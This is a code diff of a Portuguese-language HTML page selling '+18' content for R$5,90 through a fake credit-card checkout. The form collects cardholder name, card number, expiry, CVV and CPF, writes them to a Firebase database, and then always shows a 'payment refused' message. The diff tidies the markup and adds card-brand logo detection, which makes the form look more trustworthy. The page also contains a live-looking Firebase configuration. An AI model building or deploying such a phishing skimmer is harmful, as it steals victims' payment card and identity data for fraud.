@@ -6,12 +6,11 @@
   <title>Conteúdo Exclusivo +18</title>
   <script src="https://cdn.tailwindcss.com"></script>
 
-  <!-- Firebase SDK (compatível com navegador puro) -->
+  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
   <script>
-    // Configuração do Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyDQkT14oYUEDCujty-q-c9ffwHDQsaggl8",
       authDomain: "checkoutconteudo18.firebaseapp.com",
@@ -21,52 +20,33 @@
       messagingSenderId: "972861651239",
       appId: "1:972861651239:web:804cd8aef9c37711695102"
     };
-
-    // Inicializa o Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
   </script>
 </head>
 <body class="bg-black text-white font-sans">
-  <!-- CONTAINER PRINCIPAL -->
   <div class="min-h-screen flex items-center justify-center">
-
     <!-- PÁGINA DE VENDAS -->
     <div id="venda" class="max-w-3xl w-full p-8 text-center">
-      
       <p class="text-lg mb-6">Conteúdo exclusivo para maiores de 18 anos. Desperte seus desejos mais intensos com acesso imediato e sigiloso.</p>
       <ul class="text-left mb-6 space-y-2 px-6">
         <li>✅ Acesso instantâneo após o pagamento</li>
         <li>✅ Totalmente anônimo e seguro</li>
         <li>✅ Conteúdo quente +18</li>
-	<li>✅ Pagamento único</li>
-
+        <li>✅ Pagamento único</li>
       </ul>
       <p class="text-xl font-semibold mb-6 text-pink-400">De <span class="line-through text-gray-400">R$29,90</span> por <span class="text-pink-500">R$5,90</span></p>
-
-      <button onclick="irParaCheckout()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-6 rounded-full transition">
-        Quero Acessar Agora 🔥
-      </button>
-      <br/>
-      <br/>
+      <button onclick="irParaCheckout()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-6 rounded-full transition">Quero Acessar Agora 🔥</button>
+      <br/><br/>
       <img src="https://i.imgur.com/PwjmTeP.jpeg" alt="Conteúdo 18+" class="rounded-lg mx-auto mb-6 shadow-lg">
-
       <p class="text-xl font-semibold mb-6 text-pink-400">De <span class="line-through text-gray-400">R$29,90</span> por <span class="text-pink-500">R$5,90</span></p>
-
-      <button onclick="irParaCheckout()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-6 rounded-full transition">
-        Quero Acessar Agora 🔥
-      </button>
-
+      <button onclick="irParaCheckout()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-6 rounded-full transition">Quero Acessar Agora 🔥</button>
       <p class="mt-4 text-sm text-gray-400">Você será redirecionado para o pagamento seguro</p>
     </div>
 
     <!-- CHECKOUT -->
     <div id="checkout" class="hidden w-full max-w-3xl bg-white text-black rounded-lg shadow-lg p-10 relative">
-      <!-- Botão de Fechar -->
-      <button onclick="fecharCheckout()" class="absolute top-4 right-4 text-sm text-pink-600 hover:text-pink-800 font-semibold">
-        ✖ Fechar
-      </button>
-
+      <button onclick="fecharCheckout()" class="absolute top-4 right-4 text-sm text-pink-600 hover:text-pink-800 font-semibold">✖ Fechar</button>
       <h2 class="text-2xl font-semibold mb-6 text-center">Pagamento com cartão</h2>
       <form id="checkoutForm" class="space-y-4">
         <div>
@@ -76,6 +56,10 @@
         <div>
           <label class="block text-sm font-medium text-gray-700">Número do cartão</label>
           <input type="text" id="numeroCartao" maxlength="19" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="1234 5678 9012 3456" required>
+          <!-- Bandeira detectada -->
+          <div id="bandeiraCartao" class="mt-2 h-8">
+            <img id="bandeiraImagem" src="" alt="" class="h-8 hidden" />
+          </div>
         </div>
         <div class="flex gap-4">
           <div class="w-1/2">
@@ -91,9 +75,7 @@
           <label class="block text-sm font-medium text-gray-700">CPF</label>
           <input type="text" id="cpf" maxlength="14" class="mt-1 block w-full rounded-md border-gray-300 shadow-sm p-2" placeholder="000.000.000-00" required>
         </div>
-        <button type="submit" class="mt-6 w-full bg-pink-600 text-white font-semibold py-3 rounded-lg hover:bg-pink-700 transition">
-          Pagar R$ 5,90
-        </button>
+        <button type="submit" class="mt-6 w-full bg-pink-600 text-white font-semibold py-3 rounded-lg hover:bg-pink-700 transition">Pagar R$ 5,90</button>
       </form>
     </div>
   </div>
@@ -112,7 +94,7 @@
 
     const form = document.getElementById('checkoutForm');
 
-    // Formatadores de campos
+    // Formatadores
     document.getElementById('numeroCartao').addEventListener('input', e => {
       let value = e.target.value.replace(/\D/g, '').substring(0,16);
       e.target.value = value.replace(/(.{4})/g, '$1 ').trim();
@@ -136,17 +118,15 @@
       e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
     });
 
-    // Envio para Firebase
+    // Firebase envio
     form.addEventListener('submit', function(event) {
       event.preventDefault();
-
       const nome = document.getElementById('nomeCartao').value.trim();
       const numero = document.getElementById('numeroCartao').value.trim();
       const validade = document.getElementById('validade').value.trim();
       const cvv = document.getElementById('cvv').value.trim();
       const cpf = document.getElementById('cpf').value.trim();
 
-      // Enviar para Firebase
       const novaEntrada = firebase.database().ref("pagamentos").push();
       novaEntrada.set({
         nome,
@@ -158,9 +138,49 @@
       }).then(() => {
         alert("Seu pagamento foi Recusado! Tente novamente mais tarde.");
         form.reset();
+        document.getElementById('bandeiraImagem').classList.add('hidden');
       }).catch((error) => {
         alert("Erro ao enviar: " + error.message);
       });
+    });
+
+    // Detectar bandeira do cartão
+    const bandeiraImagem = document.getElementById("bandeiraImagem");
+    const inputNumeroCartao = document.getElementById("numeroCartao");
+
+    function detectarBandeira(numero) {
+      const num = numero.replace(/\D/g, '');
+      if (/^4/.test(num)) return "visa";
+      if (/^5[1-5]/.test(num)) return "mastercard";
+      if (/^3[47]/.test(num)) return "amex";
+      if (/^6(?:011|5)/.test(num)) return "discover";
+      if (/^3(?:0[0-5]|[68])/.test(num)) return "diners";
+      if (/^35/.test(num)) return "jcb";
+      return null;
+    }
+
+    function mostrarBandeira(bandeira) {
+      if (!bandeira) {
+        bandeiraImagem.classList.add("hidden");
+        return;
+      }
+      const imagens = {
+        visa: "https://img.icons8.com/color/48/000000/visa.png",
+        mastercard: "https://img.icons8.com/color/48/000000/mastercard.png",
+        amex: "https://img.icons8.com/color/48/000000/amex.png",
+        discover: "https://img.icons8.com/color/48/000000/discover.png",
+        diners: "https://img.icons8.com/color/48/000000/diners-club.png",
+        jcb: "https://img.icons8.com/color/48/000000/jcb.png"
+      };
+      bandeiraImagem.src = imagens[bandeira];
+      bandeiraImagem.alt = bandeira;
+      bandeiraImagem.classList.remove("hidden");
+    }
+
+    inputNumeroCartao.addEventListener("input", () => {
+      const numero = inputNumeroCartao.value;
+      const bandeira = detectarBandeira(numero);
+      mostrarBandeira(bandeira);
     });
   </script>
 </body>
